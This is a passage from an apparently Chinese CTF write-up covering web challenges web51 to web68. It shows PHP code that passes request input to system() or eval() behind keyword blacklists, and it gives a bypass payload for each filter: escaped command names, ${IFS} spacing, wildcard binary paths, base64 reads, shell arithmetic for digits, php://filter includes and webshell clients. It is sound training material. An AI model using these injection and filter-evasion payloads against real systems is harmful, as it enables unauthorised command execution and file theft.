class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤tac</p><p>解法一：使用转义字符绕过</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">url/?c=ta\c<span class="hljs-variable">&lt;&gt;</span>fla\g.php||<br></code></pre></td></tr></table></figure><p>解法二：使用其他命令</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">url/?c<span class="hljs-punctuation">=</span>nl&lt;fla&#x27;&#x27;g.php<span class="hljs-string">||</span><br></code></pre></td></tr></table></figure><h4 id="web52">web52</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤了&lt;&gt;，但放出<span class="math inline">\(，可以使用\)</span>{IFS}</p><p>首先使用：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">url/<span class="hljs-string">?c</span>=ta\c<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;fla?.php|<span class="hljs-params"></span>|<br></code></pre></td></tr></table></figure><p>出现：</p><figure><img src="/2024/12/03/Web/1733230410283.png" alt="1733230410283"><figcaption aria-hidden="true">1733230410283</figcaption></figure><p>flag竟然不在这里。</p><p>目录穿越查找根目录，读取该目录下的flag即可：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">url<span class="hljs-regexp">/?c=ta\c$&#123;IFS&#125;../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>fla\g||<br></code></pre></td></tr></table></figure><h4 id="web53">web53</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>.<span class="hljs-variable">$d</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no&#x27;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>跟上一题相比去掉了黑洞，好像没什么特别的。</p><p>可能有一个小小知识点，参考原文链接：https://blog.csdn.net/Myon5/article/details/139576761</p><p>（1）直接执行 system($c);</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">system</span>(<span class="hljs-symbol">$</span>c);<br></code></pre></td></tr></table></figure><p>这种方式会直接执行命令 $c并将命令的输出直接发送到<strong>标准输出（通常是浏览器）</strong>；不会返回命令的输出值，因此不能对输出结果进行进一步处理。</p><p>（2）使用一个参数来接受 system 的返回值后再输出它</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$d</span> = system(<span class="hljs-variable">$c</span>);<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>.<span class="hljs-variable">$d</span>;<br></code></pre></td></tr></table></figure><p>这种方式不仅会执行命令 $c，而且会将命令的最后一行输出结果赋值给变量$d；然后通过 echo将变量 $d的内容输出到标准输出；如果命令产生了多行输出，只有最后一行会被存储在变量$d 中并输出，而其他行会直接输出到标准输出。其中br是 HTML标签，用于在网页中插入换行符。 效果：</p><figure><img src="/2024/12/03/Web/1733230432619.png" alt="1733230432619"><figcaption aria-hidden="true">1733230432619</figcaption></figure><p>本题解法：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">url/<span class="hljs-string">?c</span>=ta\c<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;fla\g.php<br></code></pre></td></tr></table></figure><h4 id="web54">web54</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>限制了转义字符的使用，但这里可以使用<code>?</code>进行匹配</p><p>解法一：寻找其他可以替代的命令<code>grep</code>；<code>vi</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">url/?c=grep<span class="hljs-variable">$&#123;IFS&#125;</span>fla<span class="hljs-variable">$&#123;IFS&#125;</span>fla?.php<br><span class="hljs-regexp">//</span>表示在flag.php中寻找fla<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">url/?c=vi<span class="hljs-variable">$&#123;IFS&#125;</span>fla?.php<br><span class="hljs-regexp">//</span>查看源码<br></code></pre></td></tr></table></figure><p>解法二：<code>?</code>直接匹配常用命令路径</p><p><strong>知识点：</strong></p><p>bin为binary的简写，主要放置一些系统的必备执行档例如:cat、cp、chmoddf、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等。我们日常直接使用的cat或者ls等等都其实是简写，例如ls完整全称应该是/bin/ls</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">url/<span class="hljs-string">?c</span>=<span class="hljs-regexp">/bin/ca</span>?<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;f?<span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><br>/<span class="hljs-regexp">/查看源码，使用过滤的命令，后接的语句多用？</span><br></code></pre></td></tr></table></figure><h4 id="web55">web55</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里为无数字的命令执行，注意：<strong>这里是命令执行，采用特殊字符运算构造字母的路是走不通的。</strong></p><p>解法一：由于这里没有过滤数字，可以利用base64命令读取文件</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">url/<span class="hljs-string">?c</span>=<span class="hljs-regexp">/???/</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-number">64</span> <span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><br>/<span class="hljs-regexp">/base64解码即可</span><br></code></pre></td></tr></table></figure><p>解法二：利用php强制文件上传的机制</p><figure><img src="/2024/12/03/Web/1733230458531.png" alt="1733230458531"><figcaption aria-hidden="true">1733230458531</figcaption></figure><p>这里注意空格使用url编码或者%20代替，执行的bash命令最好加上注释<code>#!/bin/bash</code></p><p><strong>另一个知识点</strong>：</p><p>如果本题是<code>eval()</code>代码执行，在get传参时需要闭合php标签，传入：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">url/<span class="hljs-string">?c</span>=<span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`. /???/????????[@-[]`</span>;<span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>执行php代码，其中<code>&lt;?=</code>相当于<code>&lt;?php echo</code></p><h4 id="web56">web56</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>无字母数字的命令执行，利用php强制文件上传机制，同上。</p><h4 id="web57">web57</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 还能炫的动吗？</span><br><span class="hljs-comment">//flag in 36.php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat &quot;</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>知识点</strong>：</p><p>在shell中可以利用<code>$</code>和<code>()</code>进行构造数字:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arcade">$(()) 代表做一次运算，因为里面为空，也表示值为<span class="hljs-number">0</span><br>$((~$(()))) 对<span class="hljs-number">0</span>作取反运算，值为<span class="hljs-number">-1</span><br>$(($((~$(())))$((~$(()))))) <span class="hljs-number">-1</span><span class="hljs-number">-1</span>，也就是(<span class="hljs-number">-1</span>)+(<span class="hljs-number">-1</span>)为<span class="hljs-number">-2</span>，所以值为<span class="hljs-number">-2</span><br>$((~$(($((~$(())))$((~$(()))))))) 再对<span class="hljs-number">-2</span>做一次取反得到<span class="hljs-number">1</span>，所以值为<span class="hljs-number">1</span><br>~a = -a<span class="hljs-number">-1</span><br></code></pre></td></tr></table></figure><p>构造出数字36，-37取反即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">data = <span class="hljs-string">&quot;$((&quot;</span> + <span class="hljs-string">&quot;$((~$(())))&quot;</span>*<span class="hljs-number">37</span> +<span class="hljs-string">&quot;))&quot;</span>   <span class="hljs-comment">#-37</span><br>data = <span class="hljs-string">&quot;$((&quot;</span> + <span class="hljs-string">&quot;~&quot;</span> + data + <span class="hljs-string">&quot;))&quot;</span><br><span class="hljs-built_in">print</span>(data)<br><span class="hljs-comment">#-1 = $((~$(())))</span><br></code></pre></td></tr></table></figure><p>data即为payload。</p><h4 id="web58">web58</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>使用蚁剑连接即可；</p><p>也可以使用show_source(‘’)或者highlight_file(‘’)函数；</p><p>还可以<strong>使用include()转接头</strong>：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c</span>=include(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>])<span class="hljs-comment">;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br></code></pre></td></tr></table></figure><p><strong>知识点</strong>：（一些读取文件的函数）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$filename</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-variable">$filename</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">php_strip_whitespace</span>(<span class="hljs-variable">$filename</span>));<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>));<br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$filename</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$filename</span>)); <span class="hljs-comment">// var_dump</span><br><span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;r&quot;</span>), <span class="hljs-variable">$size</span>);<br><span class="hljs-comment">//文件包含</span><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span>); <span class="hljs-comment">// 非php代码</span><br><span class="hljs-keyword">include_once</span>(<span class="hljs-variable">$filename</span>); <span class="hljs-comment">// 非php代码</span><br><span class="hljs-keyword">require</span>(<span class="hljs-variable">$filename</span>); <span class="hljs-comment">// 非php代码</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-variable">$filename</span>); <span class="hljs-comment">// 非php代码</span><br><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-string">&quot;cat flag&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>), <span class="hljs-variable">$size</span>));<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;r&quot;</span>))); <span class="hljs-comment">// 读取一行</span><br><span class="hljs-title function_ invoke__">fpassthru</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;r&quot;</span>)); <span class="hljs-comment">// 从当前位置一直读取到 EOF</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">fgetcsv</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;r&quot;</span>), <span class="hljs-variable">$size</span>));<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">fgetss</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;r&quot;</span>))); <span class="hljs-comment">// 从文件指针中读取一行并过滤掉 HTML 标记</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">fscanf</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>),<span class="hljs-string">&quot;%s&quot;</span>));<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">parse_ini_file</span>(<span class="hljs-variable">$filename</span>)); <span class="hljs-comment">// 失败时返回 false , 成功返回配置数组</span><br></code></pre></td></tr></table></figure><h4 id="web59">web59</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>同上。</p><h4 id="web60">web60</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>同上。</p><p>唯一的区别是使用蚁剑时无回显，利用disable_function()插件解决，逐个模式尝试即可。</p><h4 id="web61">web61</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>同上。</p><h4 id="web62">web62</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>同上。</p><h4 id="web63">web63</h4><p>同上</p><h4 id="web64">web64</h4><p>同上</p><h4 id="web65">web65</h4><p>同上。</p><h4 id="web66">web66</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>使用<code>highlight_file()</code>读文件，显示：</p><figure><img src="/2024/12/03/Web/1733230494193.png" alt="1733230494193"><figcaption aria-hidden="true">1733230494193</figcaption></figure><p>呵呵。</p><p>解法一：蚁剑连接，多模式尝试，在root下找到flag.txt</p><p>解法二：使用php函数查看根目录找到flag路径，然后使用highlight_file('路径')读取文件</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c</span>=var_dump(scandir(<span class="hljs-string">&#x27;/&#x27;</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><figure><img src="/2024/12/03/Web/1733230529002.png" alt="1733230529002"><figcaption aria-hidden="true">1733230529002</figcaption></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c</span>=highlight_file(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h4 id="web67">web67</h4><p>同上，print_r()被禁止，使用var_dump()即可。</p><h4 id="web68">web68</h4><p>代码同上，使用<code>var_dump(scandir('/'))</code>查看路径，但读文件的函数基本被禁止。</p><p>使用include()转接头即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=include(<span class="hljs-variable">$_POST</span>[1]);&amp;1=php://filter/convert.base64-encode/resource=/flag.txt<br></code></pre></td></tr></table></figure><p>或者：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c</span>=include(<span 